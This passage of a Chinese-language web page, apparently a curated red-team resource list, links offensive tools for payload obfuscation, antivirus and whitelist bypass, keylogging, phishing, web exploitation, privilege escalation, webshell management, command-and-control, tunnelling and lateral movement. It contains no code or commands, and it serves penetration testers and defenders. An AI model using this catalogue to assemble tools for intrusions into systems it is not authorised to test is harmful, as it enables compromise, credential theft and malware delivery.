<li><a href="https://github.com/cobbr/PSAmsi">https://github.com/cobbr/PSAmsi</a> PSAmsi是一种用于审核和破解 AMSI签名的工具</li>
<li><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 反射 DLL 注入是一种库注入技术，其中采用反射编程的概念来执行将库从内存加载到主机进程中 ✨</li>
<li><a href="https://github.com/CroweCyber%E2%80%8B%E2%80%8Bsecurity/ps1encode">https://github.com/CroweCyber​​security/ps1encode</a> ps1encode用于生成和编码基于 powershell 的 metasploit 有效载荷</li>
<li><a href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a> 更糟糕的 PDF会将普通 PDF 文件变成恶意文件</li>
<li><a href="https://github.com/hlldz/SpookFlare">https://github.com/hlldz/SpookFlare</a> SpookFlare对绕过安全措施有不同的看法，它让您有机会绕过客户端检测和网络端检测的端点对策</li>
<li><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> GreatSCT是一个开源项目，用于生成应用程序白名单绕过 ✨</li>
<li><a href="https://github.com/Ben0xA/nps">https://github.com/Ben0xA/nps</a> nps在没有 powershell 的情况下运行 powershell ✨</li>
<li><a href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a> Meterpreter_Paranoid_Mode.sh允许用户通过检查它所连接的处理程序的证书来保护 Meterpreter 的分段&#x2F;无分段连接</li>
<li><a href="https://github.com/khr0x40sh/MacroShop">https://github.com/khr0x40sh/MacroShop</a> MacroShop一组脚本，以帮助通过 Office 宏交付有效负载</li>
<li><a href="https://github.com/leechristensen/UnmanagedPowerShell">https://github.com/leechristensen/UnmanagedPowerShell</a> UnmanagedPowerShell从非托管进程执行 PowerShell</li>
<li><a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a> 用于制作环境键控有效载荷的Ebowla框架 ✨</li>
<li><a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py">https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py</a> make-pdf-embedded一个工具，用于创建带有嵌入文件的 PDF 文档</li>
<li><a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a> avet (AntiVirusEvasionTool) 的目标是使用不同规避技术的具有可执行文件的 Windows 机器 ✨</li>
<li><a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a> EvilClippy用于创建恶意 MS Office 文档的跨平台助手</li>
<li><a href="https://github.com/d35ha/CallObfuscator">https://github.com/d35ha/CallObfuscator</a> CallObfuscator混淆来自静态分析工具和调试器的 windows api</li>
<li><a href="https://github.com/TheWover/donut">https://github.com/TheWover/donut</a> Donut是一种 shellcode 生成工具，可从 .NET 程序集创建与位置无关的 shellcode 有效载荷 ✨</li>
</ul>
<h3 id="3-防御绕过"><a href="#3-防御绕过" class="headerlink" title="3. 防御绕过"></a>3. 防御绕过</h3><h4 id="a-键盘记录器"><a href="#a-键盘记录器" class="headerlink" title="a. 键盘记录器"></a>a. 键盘记录器</h4><ul>
<li><a href="https://github.com/cheetz/ceylogger/blob/master/skeleton">https://github.com/cheetz/ceylogger/blob/master/skeleton</a></li>
<li><a href="https://github.com/cheetz/ceylogger/tree/master/version3">https://github.com/cheetz/ceylogger/tree/master/version3</a></li>
<li><a href="https://github.com/cheetz/thpDropper.git">https://github.com/cheetz/thpDropper.git</a></li>
</ul>
<h4 id="b-payload混淆"><a href="#b-payload混淆" class="headerlink" title="b. payload混淆"></a>b. payload混淆</h4><ul>
<li><a href="https://github.com/cyberspacekittens/metasploit-payloads">https://github.com/cyberspacekittens/metasploit-payloads</a></li>
<li><a href="https://github.com/thealpiste/C_ReverseHTTPS_Shellcode">https://github.com/thealpiste/C_ReverseHTTPS_Shellcode</a></li>
</ul>
<h4 id="c-沙盒绕过免杀"><a href="#c-沙盒绕过免杀" class="headerlink" title="c. 沙盒绕过免杀"></a>c. 沙盒绕过免杀</h4><ul>
<li><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></li>
<li><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a> ✨</li>
</ul>
<h4 id="d-应用白名单绕过"><a href="#d-应用白名单绕过" class="headerlink" title="d. 应用白名单绕过"></a>d. 应用白名单绕过</h4><ul>
<li><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> ✨</li>
</ul>
<h4 id="e-Code-Caves"><a href="#e-Code-Caves" class="headerlink" title="e. Code Caves"></a>e. Code Caves</h4><ul>
<li><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a> 后门工厂 (BDF)将使用用户所需的 shellcode 修补可执行二进制文件，并继续正常执行预修补状态 ✨</li>
</ul>
<h4 id="f-powershell混淆"><a href="#f-powershell混淆" class="headerlink" title="f. powershell混淆"></a>f. powershell混淆</h4><ul>
<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> ✨</li>
<li><a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a></li>
</ul>
<h4 id="g-NoPowerShell"><a href="#g-NoPowerShell" class="headerlink" title="g. NoPowerShell"></a>g. NoPowerShell</h4><ul>
<li><a href="https://github.com/PowerShellEmpire/PowerTools/">https://github.com/PowerShellEmpire/PowerTools/</a> ✨</li>
</ul>
<h3 id="4-投递利用"><a href="#4-投递利用" class="headerlink" title="4. 投递利用"></a>4. 投递利用</h3><h4 id="a-载荷投递"><a href="#a-载荷投递" class="headerlink" title="a. 载荷投递"></a>a. 载荷投递</h4><h5 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h5><ul>
<li><a href="https://github.com/securestate/king-phisher">https://github.com/securestate/king-phisher</a> King Phisher是一种通过模拟现实世界的网络钓鱼攻击来测试和提高用户意识的工具</li>
<li><a href="https://github.com/Raikia/FiercePhish">https://github.com/Raikia/FiercePhish</a> FiercePhish是一个成熟的网络钓鱼框架，用于管理所有网络钓鱼活动 ✨</li>
<li><a href="https://github.com/fireeye/ReelPhish/">https://github.com/fireeye/ReelPhish/</a> ReelPhish是一种实时两因素网络钓鱼工具</li>
<li><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a> Gophish是一个开源网络钓鱼工具包，专为企业和渗透测试人员设计 ✨</li>
<li><a href="https://github.com/ustayready/CredSniper">https://github.com/ustayready/CredSniper</a> CredSniper是一个使用 Python 微框架 Flask 和 Jinja2 模板编写的网络钓鱼框架，支持捕获 2FA 令牌</li>
<li><a href="https://github.com/fireeye/PwnAuth">https://github.com/fireeye/PwnAuth</a> PwnAuth一个用于启动和管理 OAuth 滥用活动的 Web 应用程序框架</li>
<li><a href="https://github.com/pentestgeek/phishing-frenzy">https://github.com/pentestgeek/phishing-frenzy</a> 网络钓鱼狂潮Ruby on Rails 网络钓鱼框架</li>
<li><a href="https://github.com/L4bF0x/PhishingPretexts">https://github.com/L4bF0x/PhishingPretexts</a> 网络钓鱼借口是用于攻击性网络钓鱼活动的借口库</li>
<li><a href="https://github.com/drk1wi/Modlishka">https://github.com/drk1wi/Modlishka</a> Modlishka是一种灵活而强大的反向代理，它将您的道德网络钓鱼活动提升到一个新的水平 ✨</li>
<li><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a> Evilginx2是一个中间人攻击框架，用于任何 Web 服务的网络钓鱼凭据和会话 cookie ✨</li>
</ul>
<h5 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h5><ul>
<li><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a> BeEF是浏览器开发框架的缩写 ✨</li>
</ul>
<h4 id="b-Web漏洞利用"><a href="#b-Web漏洞利用" class="headerlink" title="b. Web漏洞利用"></a>b. Web漏洞利用</h4><h5 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h5><ul>
<li><a href="https://portswigger.net/burp">https://portswigger.net/burp</a> ✨</li>
<li><a href="https://builtwith.com/">https://builtwith.com/</a></li>
<li><a href="https://github.com/RetireJS/retire.js/">https://github.com/RetireJS/retire.js/</a></li>
<li><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
</ul>
<h5 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h5><ul>
<li><a href="https://xsshunter.com/">https://xsshunter.com/</a></li>
<li><a href="https://github.com/Varbaek/xsser">https://github.com/Varbaek/xsser</a> ✨</li>
</ul>
<h5 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h5><ul>
<li><a href="http://sqlmap.org/">http://sqlmap.org/</a> ✨</li>
<li><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></li>
<li><a href="https://github.com/codingo/NoSQLMap">https://github.com/codingo/NoSQLMap</a> ✨</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a></li>
</ul>
<h5 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h5><ul>
<li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> ✨</li>
<li><a href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a></li>
<li><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> ✨</li>
<li><a href="https://github.com/JackOfMostTrades/gadgetinspector">https://github.com/JackOfMostTrades/gadgetinspector</a></li>
</ul>
<h5 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h5><ul>
<li><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> ✨</li>
</ul>
<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><ul>
<li><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a> ✨</li>
<li><a href="https://github.com/bcoles/ssrf_proxy">https://github.com/bcoles/ssrf_proxy</a></li>
</ul>
<h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><ul>
<li><a href="https://github.com/luisfontes19/xxexploiter">https://github.com/luisfontes19/xxexploiter</a> ✨</li>
<li><a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></li>
</ul>
<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><ul>
<li><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a></li>
</ul>
<h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><ul>
<li><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a> ✨</li>
</ul>
<h5 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h5><ul>
<li><a href="https://github.com/Lucifer1993/TPscan">https://github.com/Lucifer1993/TPscan</a> ThinkPHP漏洞检测</li>
<li><a href="https://github.com/OWASP/joomscan">https://github.com/OWASP/joomscan</a> Joomla漏洞检测</li>
<li><a href="https://github.com/immunIT/drupwn">https://github.com/immunIT/drupwn</a> Drupal漏洞检测</li>
</ul>
<h4 id="c-系统-x2F-协议漏洞利用"><a href="#c-系统-x2F-协议漏洞利用" class="headerlink" title="c. 系统&#x2F;协议漏洞利用"></a>c. 系统&#x2F;协议漏洞利用</h4><h5 id="struts"><a href="#struts" class="headerlink" title="struts"></a>struts</h5><ul>
<li><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a> ✨</li>
</ul>
<h5 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h5><ul>
<li><a href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a> Shiro&lt;&#x3D;1.2.4反序列化检测工具 ✨</li>
</ul>
<h5 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h5><ul>
<li><a href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a> fastjson命令执行利用工具 ✨</li>
</ul>
<h5 id="JDNI"><a href="#JDNI" class="headerlink" title="JDNI"></a>JDNI</h5><ul>
<li><a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></li>
</ul>
<h5 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h5><ul>
<li><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></li>
</ul>
<h5 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h5><ul>
<li><a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a>  ✨</li>
<li><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a></li>
<li><a href="https://github.com/jtesta/ssh-mitm">https://github.com/jtesta/ssh-mitm</a></li>
<li><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></li>
<li><a href="https://github.com/h2non/toxy">https://github.com/h2non/toxy</a></li>
<li><a href="https://github.com/bettercap/bettercap">https://github.com/bettercap/bettercap</a> ✨</li>
</ul>
<h5 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h5><ul>
<li><a href="https://github.com/OffensivePython/Saddam">https://github.com/OffensivePython/Saddam</a></li>
</ul>
<h2 id="0x03后渗透"><a href="#0x03后渗透" class="headerlink" title="0x03	后渗透"></a>0x03	后渗透</h2><h3 id="1-权限提升"><a href="#1-权限提升" class="headerlink" title="1. 权限提升"></a>1. 权限提升</h3><h4 id="a-Linux提权"><a href="#a-Linux提权" class="headerlink" title="a. Linux提权"></a>a. Linux提权</h4><p><strong>提权漏洞</strong></p>
<ul>
<li><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a> ✨</li>
<li><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> ✨</li>
<li><a href="https://github.com/xairy/kernel-exploits">https://github.com/xairy/kernel-exploits</a></li>
</ul>
<p><strong>提权脚本</strong></p>
<ul>
<li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> ✨</li>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a> ✨</li>
<li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a> ✨</li>
<li><a href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a> ✨</li>
<li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a> ✨</li>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a> ✨</li>
<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
</ul>
<h4 id="b-Windows提权"><a href="#b-Windows提权" class="headerlink" title="b. Windows提权"></a>b. Windows提权</h4><p><strong>域提权</strong></p>
<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a> PowerView是一种 PowerShell 工具，用于在 Windows 域上获得网络态势感知</li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a> Get-GPPPassword检索通过组策略首选项推送的帐户的明文密码和其他信息</li>
<li><a href="https://github.com/fox-it/Invoke-ACLPwn">https://github.com/fox-it/Invoke-ACLPwn</a> Invoke-ACLpwn是一种工具，可自动发现和窃取 Active Directory 中配置不安全的 ACL</li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> BloodHound使用图论来揭示 Active Directory 环境中隐藏且通常是意外的关系  ✨</li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a> PyKEK（Python Kerberos Exploitation Kit），一个用于操作 KRB5 相关数据的 Python 库 ✨</li>
<li><a href="https://github.com/l0ss/Grouper">https://github.com/l0ss/Grouper</a> Grouper PowerShell 脚本，用于帮助查找 AD 组策略中的易受攻击的设置</li>
<li><a href="https://github.com/sense-of-security/ADRecon">https://github.com/sense-of-security/ADRecon</a> ADRecon是一种工具，它以特殊格式的 Microsoft Excel 报告从 AD 环境中提取各种工件（如下突出显示），该报告包括带有指标的摘要视图，以便于分析</li>
<li><a href="https://github.com/canix1/ADACLScanner">https://github.com/canix1/ADACLScanner</a> ADACLScanner一种用于 Active Directory 中 ACL 的脚本</li>
<li><a href="https://github.com/cyberark/ACLight">https://github.com/cyberark/ACLight</a> ACLight一个有用的脚本，用于高级发现可能被定位的域特权帐户 - 包括影子管理员</li>
<li><a href="https://github.com/leoloobeek/LAPSToolkit">https://github.com/leoloobeek/LAPSToolkit</a> LAPSToolkit是一种审计和攻击 LAPS 环境的工具</li>
<li><a href="https://www.pingcastle.com/download">https://www.pingcastle.com/download</a> PingCastle是一个免费的、基于 Windows 的实用程序，用于审核 AD 基础架构的风险级别并检查易受攻击的做法 ✨</li>
<li><a href="https://github.com/cyberark/RiskySPN">https://github.com/cyberark/RiskySPN</a> RiskySPNs是一组 PowerShell 脚本，专注于检测和滥用与 SPN（服务主体名称）关联的帐户</li>
<li><a href="https://github.com/machosec/Mystique">https://github.com/machosec/Mystique</a> Mystique是一个使用 Kerberos S4U 扩展的 PowerShell 工具，该模块可以帮助蓝队识别有风险的 Kerberos 委托配置，以及红队通过利用 KCD 和协议转换来冒充任意用户</li>
<li><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a> Rubeus是一个用于原始 Kerberos 交互和滥用的 C# 工具集 ✨</li>
<li><a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a> kekeo是一个小工具箱，我已经开始在 C 中操作 Microsoft Kerberos</li>
</ul>
<p><strong>本地提权</strong></p>
<ul>
<li><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a> UACMe是一种开源评估工具，其中包含许多绕过多个版本操作系统上的 Windows 用户帐户控制的方法 ✨</li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a> windows-kernel-exploits集合 windows 内核漏洞利用 ✨</li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a> PowerUp旨在成为依赖错误配置的常见 Windows 权限提升向量的交换所</li>
<li><a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a> Elevate Kit演示了如何通过 Cobalt Strike 的 Beacon 负载使用第三方权限提升攻击</li>
<li><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a> Sherlock一个 PowerShell 脚本，用于快速查找本地提权漏洞的缺失软件补丁</li>
<li><a href="https://github.com/0xbadjuju/Tokenvator">https://github.com/0xbadjuju/Tokenvator</a> Tokenvator是一种使用 Windows 令牌提升权限的工具</li>
</ul>
<h3 id="2-权限维持"><a href="#2-权限维持" class="headerlink" title="2. 权限维持"></a>2. 权限维持</h3><ul>
<li><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a> Tunna是一组工具，它将包装和隧道通过 HTTP 的任何 TCP 通信 ✨</li>
<li><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a> reGeorg是 reDuh 的继任者，拥有一个堡垒网络服务器并通过 DMZ 创建 SOCKS 代理 ✨</li>
<li><a href="https://github.com/wonderqs/Blade">https://github.com/wonderqs/Blade</a> Blade是一个基于控制台的 webshel​​l 连接工具，目前正在开发中，旨在成为 Chooper 的替代选择</li>
<li><a href="https://github.com/threatexpress/tinyshell">https://github.com/threatexpress/tinyshell</a> TinyShell Web Shell 框架</li>
<li><a href="https://github.com/Sw4mpf0x/PowerLurk">https://github.com/Sw4mpf0x/PowerLurk</a> PowerLurk是用于构建恶意 WMI 事件订阅的 PowerShell 工具集</li>
<li><a href="https://github.com/HarmJ0y/DAMP">https://github.com/HarmJ0y/DAMP</a> DAMP自主 ACL 修改项目：通过基于主机的安全描述符修改实现持久性</li>
</ul>
<h3 id="3-命令与控制"><a href="#3-命令与控制" class="headerlink" title="3. 命令与控制"></a>3. 命令与控制</h3><h4 id="综合工具"><a href="#综合工具" class="headerlink" title="综合工具"></a>综合工具</h4><ul>
<li><a href="https://cobaltstrike.com/">https://cobaltstrike.com/</a> Cobalt Strike是用于对手模拟和红队行动的软件 ✨</li>
<li><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> Empire是一个后开发框架，包括一个纯 PowerShell2.0 Windows 代理和一个纯 Python 2.6&#x2F;2.7 Linux&#x2F;OS X 代理 ✨</li>
<li><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a> Metasploit Framework是一个计算机安全项目，它提供有关安全漏洞的信息并帮助渗透测试和 IDS 签名开发 ✨</li>
<li><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> Pupy是一个开源、跨平台（Windows、Linux、OSX、Android）远程管理和后期开发工具，主要用 python 编写 ✨</li>
<li><a href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a>  Viper - metasploit-framework 图形化内网渗透工具 ✨</li>
</ul>
<h4 id="a-webshell管理"><a href="#a-webshell管理" class="headerlink" title="a. webshell管理"></a>a. webshell管理</h4><ul>
<li><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a>  “冰蝎”动态二进制加密网站管理客户端 ✨</li>
<li><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a>  Cknife 中国菜刀 ✨</li>
<li><a href="https://github.com/2Quico/antSword">https://github.com/2Quico/antSword</a>  中国蚁剑是一款跨平台的开源网站管理工具 ✨</li>
<li><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a>  Godzilla 哥斯拉 ✨</li>
<li><a href="https://github.com/boy-hack/WebshellManager">https://github.com/boy-hack/WebshellManager</a>  WebshellManager,一句话WEB端管理工具</li>
</ul>
<h4 id="b-反弹shell"><a href="#b-反弹shell" class="headerlink" title="b. 反弹shell"></a>b. 反弹shell</h4><ul>
<li><a href="https://github.com/0dayCTF/reverse-shell-generator">https://github.com/0dayCTF/reverse-shell-generator</a> 反弹shell生成器 ✨</li>
</ul>
<h4 id="c-代理转发"><a href="#c-代理转发" class="headerlink" title="c. 代理转发"></a>c. 代理转发</h4><ul>
<li><a href="https://www.proxifier.com/">https://www.proxifier.com/</a>  proxifier 全平台代理工具，支持多种socks协议</li>
<li><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a>  frp 专注于内网穿透的高性能的反向代理应用 ✨</li>
<li><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a>  nps 轻量级、高性能、功能强大的内网穿透代理服务器 ✨</li>
<li><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a>  iox 端口转发、内网代理工具</li>
<li><a href="https://github.com/FelisCatus/SwitchyOmega">https://github.com/FelisCatus/SwitchyOmega</a>  SwitchyOmega 浏览器的代理插件</li>
<li><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a>  Neo-reGeorg 改进的reGeorg版本 ✨</li>
<li><a href="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a>  dns2tcp是一款利用dns协议传输tcp数据的工具</li>
<li><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a>  dnscat2 是一个DNS隧道工具 ✨</li>
<li><a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a>  ABPTTS 基于ssl加密的http隧道工具</li>
<li><a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a>  Termite 内网渗透代理、端口转发工具</li>
<li><a href="https://github.com/FQrabbit/SSTap-Rule">https://github.com/FQrabbit/SSTap-Rule</a>  SSTap, 一款利用虚拟网卡在网络层实现的代理工具</li>
<li><a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a>  ew 用于开启 SOCKS v5 代理服务的工具(跨平台)</li>
<li><a href="https://github.com/ntop/n2n">https://github.com/ntop/n2n</a>  n2n 开源的点对点穿透工具 ✨</li>
<li><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a>  icmpsh 一个简单的 reverse ICMP shell</li>
<li><a href="https://github.com/inconshreveable/ngrok">https://github.com/inconshreveable/ngrok</a>  ngrok 正&#x2F;反向代理，内网穿透，端口转发 ✨</li>
<li><a href="https://securesocketfunneling.github.io/ssf/">https://securesocketfunneling.github.io/ssf/</a>  ssf 全平台的加密隧道 端口转发工具</li>
<li><a href="https://github.com/haad/proxychains">https://github.com/haad/proxychains</a>  proxychains 命令行代理神器</li>
<li><a href="https://github.com/crabkun/switcher">https://github.com/crabkun/switcher</a>  switcher 一个多功能的端口转发&#x2F;端口复用工具</li>
<li><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a>  pingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具</li>
<li><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>  chisel - 一款快速稳定的隧道工具 ✨</li>
<li><a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a>  pystinger - 一款使用webshell进行流量转发的出网工具</li>
<li><a href="https://github.com/blackarrowsec/pivotnacci">https://github.com/blackarrowsec/pivotnacci</a>  pivotnacci - 通过HTTP代理建立socks连接的工具</li>
<li><a href="https://github.com/ffay/lanproxy">https://github.com/ffay/lanproxy</a>  lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具</li>
<li><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a>  Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</li>
<li><a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a>  goproxy 一款轻量级、功能强大、高性能的多种代理工具 ✨</li>
</ul>
<h4 id="d-远控工具"><a href="#d-远控工具" class="headerlink" title="d. 远控工具"></a>d. 远控工具</h4><ul>
<li><a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a> Koadic或 COM Command &amp; Control，是一种 Windows 后利用 rootkit，类似于 Meterpreter 和 Powershell Empire 等其他渗透测试工具</li>
<li><a href="https://github.com/nettitude/PoshC2_Python">https://github.com/nettitude/PoshC2_Python</a> PoshC2是一个完全用 PowerShell 编写的代理感知 C2 框架，以帮助渗透测试人员进行红队、后利用和横向移动</li>
<li><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a> Gcat一个基于 Python 的隐秘后门，使用 Gmail 作为命令和控制服务器</li>
<li><a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a> TrevorC2是一个合法的网站（可浏览），它通过隧道传输客户端&#x2F;服务器通信以进行隐蔽的命令执行</li>
<li><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a> Merlin是一个用 golang 编写的跨平台后开发 HTTP&#x2F;2 命令和控制服务器和代理 ✨</li>
<li><a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a> Quasar是一个用 C# 编码的快速、轻量级的远程管理工具 ✨</li>
<li><a href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a> Covenant是一个 .NET 命令和控制框架，旨在突出 .NET 的攻击面，使攻击性 .NET 技术的使用更容易，并作为红队人员的协作命令和控制平台 ✨</li>
<li><a href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a> Sliver是一个通用的跨平台植入框架，支持 C2 over Mutual-TLS、HTTP(S) 和 DNS</li>
<li><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a> EvilOSX适用于 macOS &#x2F; OS X 的邪恶 RAT（远程管理工具）✨</li>
<li><a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a> EggShell是iOS&#x2F;macOS&#x2F;Linux远程管理工具 ✨</li>
</ul>
<h3 id="4-横向移动"><a href="#4-横向移动" class="headerlink" title="4. 横向移动"></a>4. 横向移动</h3><ul>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a> CrackMapExec是用于渗透测试网络的瑞士军刀 ✨</li>
